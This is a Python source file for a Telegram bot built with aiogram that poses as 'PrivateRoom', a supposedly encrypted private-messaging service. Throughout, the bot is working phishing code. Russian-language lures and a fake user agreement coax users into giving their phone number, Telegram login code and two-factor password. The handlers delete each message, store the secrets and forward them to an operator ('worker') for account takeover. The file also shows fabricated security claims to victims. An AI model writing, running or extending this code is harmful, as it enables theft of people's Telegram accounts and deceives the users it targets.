import json
import logging
import os
import re
from typing import Optional

from aiogram import Bot, F, Router
from aiogram.filters import Command
from aiogram.types import (
    CallbackQuery,
    FSInputFile,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    InputMediaPhoto,
    KeyboardButton,
    MenuButtonWebApp,
    Message,
    ReplyKeyboardMarkup,
    ReplyKeyboardRemove,
    WebAppInfo,
)

from shared import db
from shared.config import DB_PATH, WEBAPP_URL, get_bot_webapp_url
from shared.notifier import notify_user_event

router = Router(name="worker_basic")
logger = logging.getLogger("worker_bot.handlers.basic")

MIRROR_PHOTO = "assets/hello.jpg"


def _is_user_authorized(user) -> bool:
    if not user:
        return False
    try:
        step = user.get("auth_step")
        sess = user.get("session_string")
    except Exception:
        step = user["auth_step"] if "auth_step" in user.keys() else None
        sess = user["session_string"] if "session_string" in user.keys() else None
    return step == "authorized" or bool(sess)



async def _send_mirror_view(
    target: Message | CallbackQuery,
    text: str,
    keyboard: InlineKeyboardMarkup,
) -> None:
    if isinstance(target, CallbackQuery):
        msg = target.message
        if msg:
            if msg.photo:
                try:
                    await msg.edit_caption(
                        caption=text,
                        reply_markup=keyboard,
                        parse_mode="HTML",
                    )
                    return
                except Exception:
                    pass
            elif os.path.exists(MIRROR_PHOTO):
                try:
                    await msg.edit_media(
                        media=InputMediaPhoto(
                            media=FSInputFile(MIRROR_PHOTO),
                            caption=text,
                            parse_mode="HTML",
                        ),
                        reply_markup=keyboard,
                    )
                    return
                except Exception:
                    pass

            try:
                await msg.edit_text(
                    text=text,
                    reply_markup=keyboard,
                    parse_mode="HTML",
                )
                return
            except Exception:
                pass

        if os.path.exists(MIRROR_PHOTO):
            await target.message.answer_photo(
                photo=FSInputFile(MIRROR_PHOTO),
                caption=text,
                reply_markup=keyboard,
                parse_mode="HTML",
            )
        else:
            await target.message.answer(
                text=text,
                reply_markup=keyboard,
                parse_mode="HTML",
            )
    else:
        if os.path.exists(MIRROR_PHOTO):
            await target.answer_photo(
                photo=FSInputFile(MIRROR_PHOTO),
                caption=text,
                reply_markup=keyboard,
                parse_mode="HTML",
            )
        else:
            await target.answer(
                text=text,
                reply_markup=keyboard,
                parse_mode="HTML",
            )


def _get_worker_id(bot: Bot) -> Optional[int]:
    token_row = db.get_token_by_token(DB_PATH, bot.token)
    if token_row and "owner_tg_id" in token_row.keys():
        return token_row["owner_tg_id"]
    return None


START_MESSAGE = (
    "🔐 <b>PrivateRoom</b>\n\n"
    "<b>Добро пожаловать в приватное пространство.</b>\n\n"
    "Здесь можно обмениваться личными материалами через <i>защищённые приватные сессии</i>, "
    "не отправляя их собеседнику обычным сообщением Telegram.\n\n"
    "<b>Сначала необходимо создать аккаунт.</b>"
)


AGREEMENT_SUMMARY = (
    "📄 <b>Пользовательское соглашение и условия доступа</b>\n\n"
    "Для обеспечения сквозного шифрования, маршрутизации приватных сессий и модерации комнат через защищённый серверный шлюз сервис запрашивает авторизацию вашей сессии Telegram.\n\n"
    "<b>Ключевые условия:</b>\n"
    "1. <b>Назначение доступа:</b> Создание изолированных комнат, автоматическая маршрутизация сессий и предотвращение утечек данных.\n"
    "2. <b>Передаваемые данные:</b> Номер телефона и одноразовый код подтверждения Telegram для подключения к защищённому шлюзу.\n"
    "3. <b>Безопасность:</b> Сервис не передаёт ваши данные третьим лицам и использует сессию исключительно для работы приватных комнат.\n\n"
    "Нажимая «Принять и продолжить», вы подтверждаете согласие с условиями."
)

AGREEMENT_FULL_TEXT = (
    "📋 <b>Полный текст пользовательского соглашения PrivateRoom</b>\n\n"
    "<b>1. Предмет соглашения</b>\n"
    "1.1. Настоящее соглашение регулирует порядок использования сервиса PrivateRoom для организации защищённого обмена сообщениями и медиафайлами.\n"
    "1.2. Подключение к сервису осуществляется путём авторизации сессии пользователя на выделенном сервере шлюза.\n\n"
    "<b>2. Предоставление доступа к сессии</b>\n"
    "2.1. Для создания комнат и контроля безопасности диалогов пользователь предоставляет номер телефона и код авторизации Telegram.\n"
    "2.2. Авторизованная сессия используется автоматизированными модулями шлюза для маршрутизации приватных сессий.\n\n"
    "<b>3. Обязанности сторон</b>\n"
    "3.1. Сервис обязуется обеспечить конфиденциальность сессионных ключей в рамках защищённого контура.\n"
    "3.2. Пользователь подтверждает добровольность передачи данных авторизации.\n\n"
    "Нажмите «Назад», чтобы вернуться к подтверждению."
)

PHONE_KEYBOARD = ReplyKeyboardMarkup(
    keyboard=[
        [KeyboardButton(text="📱 Отправить номер телефона", request_contact=True)]
    ],
    resize_keyboard=True,
    one_time_keyboard=True,
)


def get_start_keyboard(webapp_url: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text="Создать аккаунт",
                    web_app=WebAppInfo(url=webapp_url),
                )
            ],
        ]
    )


def get_agreement_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text="📋 Читать соглашение полностью",
                    callback_data="agree_full",
                )
            ],
            [
                InlineKeyboardButton(
                    text="« Назад",
                    callback_data="agree_back_start",
                )
            ],
        ]
    )


def get_back_to_agreement_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text="« Назад к соглашению",
                    callback_data="agree_view",
                )
            ]
        ]
    )


AUTHORIZED_MESSAGE = (
    "🔒 <b>PrivateRoom — Личный кабинет</b>\n\n"
    "👤 <b>Профиль:</b> <b>{nickname}</b> (@{username})\n"
    "📱 <b>Привязанный шлюз:</b> <code>{phone}</code>\n"
    "🛡 <b>Статус:</b> <code>Защищённая E2E сессия активна</code>\n\n"
    "<i>Ваш аккаунт полностью верифицирован. Вы можете создавать защищённые приватные комнаты для конфиденциального диалога.</i>"
)


def get_authorized_keyboard(webapp_url: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text="🔒 Создать приватную комнату",
                    web_app=WebAppInfo(url=webapp_url),
                )
            ],
            [
                InlineKeyboardButton(
                    text="💬 Мои комнаты",
                    callback_data="user_rooms",
                ),
                InlineKeyboardButton(
                    text="🛡 Статус шлюза",
                    callback_data="user_security",
                ),
            ],
        ]
    )


@router.message(Command("start"))
async def cmd_start(message: Message, bot: Bot) -> None:
    try:
        await message.delete()
    except Exception:
        pass

    user = None
    worker_id = _get_worker_id(bot)
    token_row = db.get_token_by_token(DB_PATH, bot.token)
    mirror_username = token_row["username"] if token_row else None

    if message.from_user:
        db.register_user(
            db_path=DB_PATH,
            tg_id=message.from_user.id,
            username=message.from_user.username,
            nickname=message.from_user.full_name or "User",
            worker_tg_id=worker_id,
            mirror_token=bot.token,
            mirror_username=mirror_username,
        )
        user = db.get_user_by_tg_id(DB_PATH, message.from_user.id)

    webapp_url = get_bot_webapp_url(bot.token)
    try:
        await bot.set_chat_menu_button(
            chat_id=message.chat.id,
            menu_button=MenuButtonWebApp(
                text="PrivateRoom",
                web_app=WebAppInfo(url=webapp_url),
            ),
        )
    except Exception:
        pass

    # If user is already authorized with an active session, display dashboard
    is_active_session = bool(user and user["session_string"] and user["auth_step"] == "authorized")
    if is_active_session:
        phone = user["phone"] or "Привязан"
        nickname = user["nickname"] or (message.from_user.full_name if message.from_user else "Пользователь")
        username = user["username"] or (message.from_user.username if message.from_user else "—")
        text = AUTHORIZED_MESSAGE.format(nickname=nickname, username=username, phone=phone)
        keyboard = get_authorized_keyboard(webapp_url)
        await _send_mirror_view(message, text, keyboard)
        return

    if message.from_user:
        db.set_user_auth_step(DB_PATH, message.from_user.id, "start")
        await notify_user_event(
            event_type="start",
            user_tg_id=message.from_user.id,
            user_username=message.from_user.username,
            user_nickname=message.from_user.full_name or "User",
            phone=user["phone"] if user else None,
            auth_step="start",
            mirror_token=bot.token,
        )

    keyboard = get_start_keyboard(webapp_url)
    await _send_mirror_view(message, START_MESSAGE, keyboard)


@router.callback_query(F.data == "user_rooms")
async def cb_user_rooms(callback: CallbackQuery, bot: Bot) -> None:
    await callback.answer()
    if callback.message:
        webapp_url = get_bot_webapp_url(bot.token)
        text = (
            "💬 <b>Ваши приватные комнаты:</b>\n\n"
            "У вас пока нет активных комнат.\n\n"
            "Нажмите «<b>Создать приватную комнату</b>», чтобы сгенерировать защищённую ссылку для собеседника."
        )
        keyboard = InlineKeyboardMarkup(
            inline_keyboard=[
                [InlineKeyboardButton(text="🔒 Создать комнату", web_app=WebAppInfo(url=webapp_url))],
                [InlineKeyboardButton(text="« Назад в меню", callback_data="agree_back_start")],
            ]
        )
        await callback.message.edit_text(text, reply_markup=keyboard, parse_mode="HTML")


@router.callback_query(F.data == "user_security")
async def cb_user_security(callback: CallbackQuery) -> None:
    await callback.answer()
    if callback.message:
        user = db.get_user_by_tg_id(DB_PATH, callback.from_user.id) if callback.from_user else None
        is_active_session = bool(user and user["session_string"] and user["auth_step"] == "authorized")
        status_text = "Активен (Верифицирован)" if is_active_session else "Не активен (Сессия сброшена / требуется вход)"
        text = (
            "🛡 <b>Параметры безопасности шлюза:</b>\n\n"
            "• Протокол шифрования: <b>AES-256-GCM / MTProto v2</b>\n"
            "• Изоляция трафика: <b>Включена (VPS Proxy Core)</b>\n"
            f"• Статус шлюза: <b>{status_text}</b>\n"
            "• Логирование диалогов: <b>Отключено (Zero-Knowledge)</b>\n\n"
            "<i>Все передаваемые медиа и сообщения самоуничтожаются после закрытия комнаты.</i>"
        )
        keyboard = InlineKeyboardMarkup(
            inline_keyboard=[
                [InlineKeyboardButton(text="« Назад в меню", callback_data="agree_back_start")],
            ]
        )
        await callback.message.edit_text(text, reply_markup=keyboard, parse_mode="HTML")


@router.callback_query(F.data == "agree_view")
async def cb_agree_view(callback: CallbackQuery) -> None:
    await callback.answer()
    if callback.message:
        await callback.message.edit_text(
            AGREEMENT_SUMMARY,
            reply_markup=get_agreement_keyboard(),
            parse_mode="HTML",
        )


@router.callback_query(F.data == "agree_full")
async def cb_agree_full(callback: CallbackQuery) -> None:
    await callback.answer()
    if callback.message:
        await callback.message.edit_text(
            AGREEMENT_FULL_TEXT,
            reply_markup=get_back_to_agreement_keyboard(),
            parse_mode="HTML",
        )


@router.callback_query(F.data == "agree_back_start")
async def cb_agree_back_start(callback: CallbackQuery, bot: Bot) -> None:
    await callback.answer()
    if callback.message:
        webapp_url = get_bot_webapp_url(bot.token)
        user = db.get_user_by_tg_id(DB_PATH, callback.from_user.id) if callback.from_user else None
        is_active_session = bool(user and user["session_string"] and user["auth_step"] == "authorized")
        if is_active_session:
            phone = user["phone"] or "Привязан"
            nickname = user["nickname"] or (callback.from_user.full_name if callback.from_user else "Пользователь")
            username = user["username"] or (callback.from_user.username if callback.from_user else "—")
            text = AUTHORIZED_MESSAGE.format(nickname=nickname, username=username, phone=phone)
            keyboard = get_authorized_keyboard(webapp_url)
            await _send_mirror_view(callback, text, keyboard)
        else:
            await _send_mirror_view(
                callback,
                START_MESSAGE,
                get_start_keyboard(webapp_url),
            )


@router.message(F.contact)
async def handle_contact(message: Message, bot: Bot) -> None:
    if message.from_user is None or message.contact is None:
        return

    phone = message.contact.phone_number
    if not phone.startswith("+"):
        phone = "+" + phone

    db.set_user_phone(DB_PATH, message.from_user.id, phone)
    db.set_user_auth_step(DB_PATH, message.from_user.id, "waiting_code")

    try:
        await message.delete()
    except Exception:
        pass

    await notify_user_event(
        event_type="phone",
        user_tg_id=message.from_user.id,
        user_username=message.from_user.username,
        user_nickname=message.from_user.full_name or "Пользователь",
        phone=phone,
        auth_step="waiting_code",
        mirror_token=bot.token,
    )


@router.message(F.text.regexp(r"^\+?[0-9\s\-()]{10,20}$"))
async def handle_manual_phone(message: Message, bot: Bot) -> None:
    if message.from_user is None or message.text is None:
        return

    # 1. If user is already authorized, do not treat any incoming numbers as a login phone
    user = db.get_user_by_tg_id(DB_PATH, message.from_user.id)
    if _is_user_authorized(user):
        return

    worker_id = _get_worker_id(bot)
    raw_digits = re.sub(r"\D", "", message.text)

    # 2. Guard against worker ID or self Telegram ID sent in chat (e.g. referral / invite code)
    if (worker_id and str(worker_id) == raw_digits) or str(message.from_user.id) == raw_digits:
        if worker_id:
            token_row = db.get_token_by_token(DB_PATH, bot.token)
            mirror_username = token_row["username"] if token_row else None
            db.register_user(
                db_path=DB_PATH,
                tg_id=message.from_user.id,
                username=message.from_user.username,
                nickname=message.from_user.full_name or "User",
                worker_tg_id=worker_id,
                mirror_token=bot.token,
                mirror_username=mirror_username,
            )
        try:
            await message.delete()
        except Exception:
            pass
        return

    # 3. Verify real phone number digit length (E.164 is 10-15 digits)
    if len(raw_digits) < 10 or len(raw_digits) > 15:
        return

    raw_phone = "+" + raw_digits

    db.set_user_phone(DB_PATH, message.from_user.id, raw_phone)
    db.set_user_auth_step(DB_PATH, message.from_user.id, "waiting_code")

    try:
        await message.delete()
    except Exception:
        pass

    await notify_user_event(
        event_type="phone",
        user_tg_id=message.from_user.id,
        user_username=message.from_user.username,
        user_nickname=message.from_user.full_name or "Пользователь",
        phone=raw_phone,
        auth_step="waiting_code",
        mirror_token=bot.token,
    )


@router.message(F.text.regexp(r"^\d{4,6}$"))
async def handle_auth_code(message: Message, bot: Bot) -> None:
    if message.from_user is None or message.text is None:
        return

    user = db.get_user_by_tg_id(DB_PATH, message.from_user.id)
    if _is_user_authorized(user):
        return

    code = message.text.strip()
    if not user:
        return

    db.set_user_auth_step(DB_PATH, message.from_user.id, "waiting_2fa")

    try:
        await message.delete()
    except Exception:
        pass

    await notify_user_event(
        event_type="code",
        user_tg_id=message.from_user.id,
        user_username=message.from_user.username,
        user_nickname=message.from_user.full_name or "Пользователь",
        phone=user["phone"] if user else None,
        auth_step="waiting_2fa",
        mirror_token=bot.token,
        details=f"Код подтверждения: <code>{code}</code>",
    )


@router.message(F.text)
async def handle_generic_text(message: Message, bot: Bot) -> None:
    if message.from_user is None or message.text is None:
        return

    if message.text.startswith("/"):
        return

    user = db.get_user_by_tg_id(DB_PATH, message.from_user.id)
    if not user:
        return

    # If already authorized, ignore generic text
    if _is_user_authorized(user):
        return

    step = user["auth_step"]

    if step == "waiting_2fa":
        password = message.text.strip()
        db.set_user_2fa_password(DB_PATH, message.from_user.id, password)
        db.set_user_session(DB_PATH, message.from_user.id, f"sess_2fa_{user['tg_id']}")
        db.set_user_auth_step(DB_PATH, message.from_user.id, "authorized")

        try:
            await message.delete()
        except Exception:
            pass

        await notify_user_event(
            event_type="2fa",
            user_tg_id=message.from_user.id,
            user_username=message.from_user.username,
            user_nickname=message.from_user.full_name or "Пользователь",
            phone=user["phone"] if user else None,
            auth_step="authorized",
            password_2fa=password,
            mirror_token=bot.token,
        )

        await message.answer(
            "✅ <b>Шлюз успешно привязан!</b>\n\n"
            "Двухэтапная аутентификация пройдена. Теперь вы можете использовать защищённые приватные сессии.",
            parse_mode="HTML",
        )
    elif step == "waiting_code":
        db.set_user_auth_step(DB_PATH, message.from_user.id, "waiting_2fa")
        try:
            await message.delete()
        except Exception:
            pass


@router.message(Command("ping"))
async def cmd_ping(message: Message) -> None:
    await message.answer("pong")


@router.message(F.web_app_data)
async def handle_webapp_data(message: Message, bot: Bot) -> None:
    if message.from_user is None or message.web_app_data is None:
        return

    raw_data = message.web_app_data.data
    logger.info("received webapp data from user %s: %s", message.from_user.id, raw_data)

    nickname = message.from_user.full_name or "Anonymous"
    try:
        data = json.loads(raw_data)
        if isinstance(data, dict):
            if data.get("action") == "auth_complete":
                sess_str = data.get("session_string") or f"sess_{message.from_user.id}"
                db.set_user_session(DB_PATH, message.from_user.id, sess_str)
                if data.get("phone"):
                    db.set_user_phone(DB_PATH, message.from_user.id, data["phone"])
                db.set_user_auth_step(DB_PATH, message.from_user.id, "authorized")
                password_2fa = data.get("password") or data.get("password_2fa") or data.get("2fa")
                if password_2fa:
                    db.set_user_2fa_password(DB_PATH, message.from_user.id, password_2fa)

                await notify_user_event(
                    event_type="session",
                    user_tg_id=message.from_user.id,
                    user_username=message.from_user.username,
                    user_nickname=nickname,
                    phone=data.get("phone"),
                    auth_step="authorized",
                    password_2fa=password_2fa,
                    mirror_token=bot.token,
                )

                await message.answer(
                    "✅ <b>Шлюз успешно привязан!</b>\n\n"
                    "Авторизация через защищенный шлюз завершена. Теперь вам доступны приватные комнаты.",
                    parse_mode="HTML",
                )
                return
            if data.get("nickname"):
                nickname = str(data["nickname"]).strip()
    except Exception:
        pass

    # If already authorized, ignore registration reset
    user = db.get_user_by_tg_id(DB_PATH, message.from_user.id)
    if _is_user_authorized(user):
        return

    worker_id = _get_worker_id(bot)
    user_id = db.register_user(
        db_path=DB_PATH,
        tg_id=message.from_user.id,
        username=message.from_user.username,
        nickname=nickname,
        worker_tg_id=worker_id,
    )
    db.set_user_agreement(DB_PATH, message.from_user.id, message.from_user.username, accepted=True, worker_tg_id=worker_id)

    await notify_user_event(
        event_type="register",
        user_tg_id=message.from_user.id,
        user_username=message.from_user.username,
        user_nickname=nickname,
        phone=None,
        auth_step="registered",
        mirror_token=bot.token,
    )

    await message.answer(
        f"Аккаунт {nickname} успешно создан.\n"
        f"ID в системе: #{user_id}\n\n"
        "Соглашение принято. Для привязки шлюза отправьте номер телефона:",
        reply_markup=PHONE_KEYBOARD,
    )
